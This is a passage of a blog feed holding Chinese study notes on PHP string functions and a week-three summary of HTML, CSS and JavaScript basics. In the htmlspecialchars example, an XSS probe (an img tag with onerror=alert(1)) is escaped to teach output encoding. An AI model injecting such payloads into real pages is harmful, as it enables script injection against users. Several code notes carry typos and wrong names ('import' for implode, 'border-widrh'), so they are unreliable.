class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = array();</span><br><span class="line">$url = &apos;https://www.baidu.com&apos;;</span><br><span class="line">$url = explode(&apos;.&apos;, $url);</span><br><span class="line">$host = $url[0];</span><br><span class="line">$name = $url[1];</span><br><span class="line">$or = $url[2];</span><br><span class="line">echo $host;</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">echo $name;</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">echo $or;</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">echo ($a==0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>OUT</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">https://www</span></span><br><span class="line"><span class="comment">baidu</span></span><br><span class="line"><span class="comment">com</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* htmlentities()函数把字符转换为HTML实体</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str = &quot;&lt;© W3CSçh°°¦§&gt;&quot;;</span><br><span class="line">echo htmlentities($str);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>OUT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">&amp;lt;&amp;copy; W3CS&amp;ccedil;h&amp;deg;&amp;deg;&amp;brvbar;&amp;sect;&amp;gt;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><ul><li>htmlspecialchars(string, flags, character-set, double_encode) 函数把一些预定义的字符转换为 HTML 实体<ul><li>&amp;        —&gt;       $amp<ul><li>“         —&gt;       &amp;quot</li></ul></li><li>‘          —&gt;       ‘</li><li>&lt;         —&gt;       &amp;lt</li><li>&gt;         —&gt;       &amp;gt</li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$payload = &apos;&lt;img src=&quot;a&quot; onerror=&quot;alert(1)&quot;&gt;&apos;;</span><br><span class="line">echo htmlspecialchars($payload);</span><br><span class="line"></span><br><span class="line">$str = &quot;This is some &lt;b&gt;bold&lt;/b&gt; text.&quot;;</span><br><span class="line">echo htmlspecialchars($str);</span><br><span class="line">echo array()==null;</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">$str = &quot;&lt;© W3CSçh°°¦§&gt;&quot;;</span><br><span class="line">echo htmlentities($str);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>OUT</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">&amp;lt;img src=&amp;quot;a&amp;quot; onerror=&amp;quot;alert(1)&amp;quot;&amp;gt;</span></span><br><span class="line"><span class="comment">This is some &amp;lt;b&amp;gt;bold&amp;lt;/b&amp;gt; text.</span></span><br><span class="line"><span class="comment">1</span></span><br><span class="line"><span class="comment">&amp;lt;&amp;copy; W3CS&amp;ccedil;h&amp;deg;&amp;deg;&amp;brvbar;&amp;sect;&amp;gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* import(separator, array)返回一个由数组元素组成字符串</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$arr = array(&apos;Hello&apos;,&apos;World!&apos;,&apos;Beautiful&apos;,&apos;Day!&apos;);</span><br><span class="line">echo implode(&quot; &quot;,$arr);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>OUT</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Hello World! Beautiful Day!</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* str_ireplace(find, replace, string, count)替换字符串中一些字符(不区分大小写) </span><br><span class="line">* strchr(string, search,before_search)搜索字符串在另一字符串中第一次出现</span><br></pre></td></tr></table></figure><ul><li>strcmp(sting1, string2)比较两个字符串<ul><li>返回0  - 如果两个字符相等</li><li>返回&lt;0 - string1&lt;string2</li><li>返回&gt;0 - string1&gt;string2</li></ul></li><li>trim()移除字符串两侧空白字符或其他预定义字符</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo str_ireplace(&quot;WORLD&quot;, &quot;Peter&quot;, &quot;Hello world!&quot;);</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">echo strchr(&quot;Hello world!&quot;,&quot;world&quot;);</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">echo strcmp(&quot;Hello world!&quot;,&quot;Hello world!&quot;);</span><br><span class="line">echo PHP_EOL;</span><br><span class="line">$str = &quot;Hello World!&quot;;</span><br><span class="line">echo $str . &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo trim($str,&quot;Hed!&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>OUT</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Hello Peter!</span><br><span class="line">world!</span><br><span class="line">0</span><br><span class="line">Hello World!&lt;br&gt;llo Worl</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><ul><li><p>substr(str, start, length)函数返回字符串的一部分；按”位“截取</p></li><li><p>mb_substr(str, start, length)函数返回字符串的一部分，按”字“截取</p><ul><li><p>start</p><p>正数—字符串指定位置开始</p><p>负数—从字符串结尾指定位置开始</p><p>0     —字符串第一个字符处开始</p></li><li><p>length</p><p>正数—从start参数所在位置返回</p><p>负数—从字符串末端返回</p></li></ul></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo substr(&quot;Hello World !&quot;,0, 5);  // 字符串截取，按照`位`截取</span><br><span class="line">echo mb_substr(&quot;abc你好!菜鸟！&quot;,0, 4);   // 字符串截取，按照`字`截取</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week3sum</title>
      <link href="/2019/08/04/week3sum/"/>
      <url>/2019/08/04/week3sum/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 对第三周学习内容的总结</p><a id="more"></a><!--export--><h3 id="1-HTML"><a href="#1-HTML" class="headerlink" title="1. HTML"></a>1. HTML</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;!DOCTYPE html&gt;声明为HTML5文档--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--HTML超文本标记语言--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--HTML文档也叫做web页面--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>HTML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line">            标题</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            段落</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>文本域、密码字段和提交按钮</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">name</span>=<span class="string">"input"</span> <span class="attr">action</span>=<span class="string">"htmlFormAction.php"</span> <span class="attr">method</span>=<span class="string">"get"</span>&gt;</span></span><br><span class="line">    Name: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span><span class="attr">value</span>=<span class="string">"Submit"</span>&gt;</span>   </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>单选按钮</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"male"</span>&gt;</span>Male<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"sex"</span> <span class="attr">value</span>=<span class="string">"female"</span>&gt;</span>Female<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复选框</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"vehicle"</span> <span class="attr">value</span>=<span class="string">"Bike"</span>&gt;</span> I have a bike<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"vehicle"</span> <span class="attr">value</span>=<span class="string">"Car"</span>&gt;</span>I have acar</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>附：<a href="https://www.runoob.com/html/html-quicklist.html" target="_blank" rel="noopener">HTML速查列表</a></p><p>​        <a href="https://www.runoob.com/tags/html-reference.html" target="_blank" rel="noopener">HTML参考手册</a></p><ul><li><p>HTML测验</p><p>测试网址：<a href="https://www.runoob.com/quiz/html-quiz.html" target="_blank" rel="noopener">HTML测验</a></p><ol><li><p>产生粗体字的HTML标签是<code>&lt;b&gt;</code>。</p></li><li><p>电子邮件链接：<code>&lt;a href=&quot;mailto:xxx@yyy&quot;&gt;</code>。</p></li><li><p>产生下拉列表的是<code>&lt;select&gt;</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">"cars"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"volvo"</span>&gt;</span>Volvo<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"saab"</span>&gt;</span>Saab<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"fiat"</span>&gt;</span>Fiat<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">"audi"</span> <span class="attr">selected</span>&gt;</span> Audi<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>XML和HTML的区别：HTML不要求标记的嵌套，配对等，不要求标记间具有一定的顺序，而XML则是严格要求嵌套，配对。</p></li><li><p>DOM代表文档对象模型，DTD是文档类型定义。</p></li><li><p>div标签的作用是：按逻辑划分页面文档。</p></li><li><p>meta标签作用用于：存储与浏览器和搜索引擎相关的信息。</p></li><li><p>对于HTML中的框架(Iframe/frameset)如何指定屏幕的其余部分：使用*。</p></li><li><p>当前文档和链接文档之间的关系是使用<code>属性rel</code>指定的。</p></li><li><p><code>target</code>的默认属性值在HTML中为<code>_self</code></p></li><li><p>HTML标记用于定义图像映射中的可单击区域是<code>&lt;area&gt;</code></p></li></ol></li></ul><h3 id="2-CSS"><a href="#2-CSS" class="headerlink" title="2. CSS"></a>2. CSS</h3><ul><li><p>选择器</p><p>CSS中id选择器以<code>&quot;#&quot;</code>来定义，类选择器以<code>&quot;.&quot;</code>来定义。</p></li><li><p>插入样式表三种方法</p><ul><li><p>外部样式表</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"mystyle.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>内部样式表</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">    hr &#123;color: sienna;&#125; </span><br><span class="line">    p &#123;margin-left: 20px;&#125;</span><br><span class="line">    body&#123;background-img: url("images/back40.gif");&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>内联样式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"color:sienna; margin-left:20px"</span>&gt;</span></span><br><span class="line">段落    </span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>优先级：内联 &gt; 内部 &gt; 外联</p></li></ul></li><li><p>CSS测试</p><p>测试网址：<a href="https://www.runoob.com/quiz/css-quiz.html" target="_blank" rel="noopener">CSS测试</a></p><ol><li><p>外部样式表正确引用的方法：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">type</span>=<span class="string">"text/css"</span> <span class="attr">href</span>=<span class="string">"mystyle.css"</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>HTML文档中，引用外部样式表正确位置是在<code>&lt;head&gt;</code>部分。</li><li><code>backgroud-color</code>属性可用于改变背景颜色，<code>color</code>可改变某个元素的文本颜色。</li><li>测试二中实例</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*粗体*/</span></span><br><span class="line"><span class="selector-tag">p</span> &#123;<span class="attribute">font-weight</span>: bold&#125;</span><br><span class="line"><span class="comment">/*超链接无下划线*/</span></span><br><span class="line"><span class="selector-tag">a</span> &#123;<span class="attribute">text-decoration</span>: none&#125;</span><br><span class="line"><span class="comment">/*文本以大写字母开头*/</span></span><br><span class="line"><span class="selector-tag">text-transform</span>: <span class="selector-tag">capitalize</span></span><br><span class="line"><span class="comment">/*改变元素字体*/</span></span><br><span class="line"><span class="selector-tag">font-family</span></span><br><span class="line"><span class="comment">/*边框上10 下5 左20 右1*/</span></span><br><span class="line"><span class="comment">/*上右下左*/</span></span><br><span class="line"><span class="selector-tag">border-widrh</span>: 10 1 5 20</span><br><span class="line"><span class="comment">/*产生带有正方形标记的项目列表*/</span></span><br><span class="line"><span class="selector-tag">list-style-type</span>: <span class="selector-tag">square</span></span><br></pre></td></tr></table></figure><ol start="5"><li>测试三—五中实例</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*使用CSS3创建圆角*/</span></span><br><span class="line"><span class="selector-tag">border-radius</span>: 30<span class="selector-tag">px</span>;</span><br><span class="line"><span class="comment">/*CSS3中元素添加阴影*/</span></span><br><span class="line"><span class="selector-tag">box-shadow</span>: 10<span class="selector-tag">px</span> 10<span class="selector-tag">px</span> 5<span class="selector-tag">px</span> <span class="selector-tag">grey</span>;</span><br><span class="line"><span class="comment">/*使用CSS3强制换行*/</span></span><br><span class="line"><span class="selector-tag">word-wrap</span>: <span class="selector-tag">break-word</span>;</span><br><span class="line"><span class="comment">/*CSS用于盒子居中*/</span></span><br><span class="line"><span class="selector-tag">margin</span>: 0 <span class="selector-tag">auto</span>;</span><br><span class="line"><span class="comment">/*盒子内内联元素居中*/</span></span><br><span class="line"><span class="selector-tag">text-align</span>: <span class="selector-tag">center</span>;</span><br><span class="line"><span class="comment">/*CSS中导入样式表正确语法*/</span></span><br><span class="line">@<span class="keyword">import</span> url(css/example.css);</span><br></pre></td></tr></table></figure></li></ol></li></ul><h3 id="3-JavaScript"><a href="#3-JavaScript" class="headerlink" title="3. JavaScript"></a>3. JavaScript</h3><p>​        <em>HTML定义网页内容，CSS描述网页布局，JS介绍网页行为</em></p><ul><li><p>JavaScript用法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">alert(<span class="string">"My First JavaScript"</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>JavaScript输出</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--弹出警告框--&gt;</span></span><br><span class="line">window.alert()</span><br><span class="line"><span class="comment">&lt;!--将内容写到HTML文档中--&gt;</span></span><br><span class="line">document.write()</span><br><span class="line"><span class="comment">&lt;!--写入到HTML元素--&gt;</span></span><br><span class="line">innerHTML</span><br><span class="line"><span class="comment">&lt;!--写入到浏览器的控制台--&gt;</span></span><br><span class="line">console.log()</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//单行注释</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">多行</span></span><br><span class="line"><span class="comment">注释</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//JavaScript使用关键字var定义变量</span></span><br><span class="line"><span class="keyword">var</span> x, length</span><br><span class="line">x = <span class="number">5</span></span><br><span class="line">length = <span class="number">6</span></span><br><span class="line"><span class="comment">//JavaScript对大小写是敏感的</span></span><br></pre></td></tr></table></figure></li><li><p>JavaScript事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>JavaScript事件<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"getElementById('demo').innerHTML=Date()"</span>&gt;</span></span><br><span class="line">            现在时间</span><br><span class="line">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​    常见的HTML事件</p><table><thead><tr><th align="left">事件</th><th>描述</th></tr></thead><tbody><tr><td align="left">onchange</td><td>HTML元素改变</td></tr><tr><td align="left">onclick</td><td>用户点击HTML元素</td></tr><tr><td align="left">onmouseover</td><td>用户在一个HTML元素上移动鼠标</td></tr><tr><td align="left">onmouseout</td><td>用户从一个HTML元素上移开鼠标</td></tr><tr><td align="left">onkeydown</td><td>用户按下键盘按键</td></tr><tr><td align="left">onload</td><td>浏览器已完成页面的加载</td></tr></tbody></table></li><li><p>JavaScript HTML DOM</p><ol><li>改变HTML</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改时间</span></span><br><span class="line"><span class="built_in">document</span>.write(<span class="built_in">Date</span>());</span><br><span class="line"><span class="comment">//修改HTML内容</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"id"</span>).innerHTML=<span class="string">"new text"</span>;</span><br><span class="line"><span class="comment">//改变HTML属性</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"id"</span>).attribute=<span class="string">"new attribute"</span>;</span><br></pre></td></tr></table></figure><ol start="2"><li><p>改变CSS</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//改变HTML样式</span></span><br><span class="line"><span class="built_in">document</span>.getElementById(id).style.property=<span class="string">"new style"</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--使用事件修改HTML样式--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">'id1'</span>&gt;</span></span><br><span class="line">            标题</span><br><span class="line">        <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"document.getElementById('id1').style.color='red'"</span>&gt;</span></span><br><span class="line">           点我！点我！！ </span><br><span class="line">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="3"><li>EventListener</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">element.addEventListener(event, <span class="function"><span class="keyword">function</span>, <span class="title">useCapture</span>)</span></span><br><span class="line"><span class="function">//第一个参数是事件的类型（"<span class="title">click</span>"和"<span class="title">mousedown</span>"）</span></span><br><span class="line"><span class="function">//第二个参数是事件触发后调用的函数</span></span><br><span class="line"><span class="function">//第三个参数是布尔值用于描述事件是冒泡还是捕获，该参数可选</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 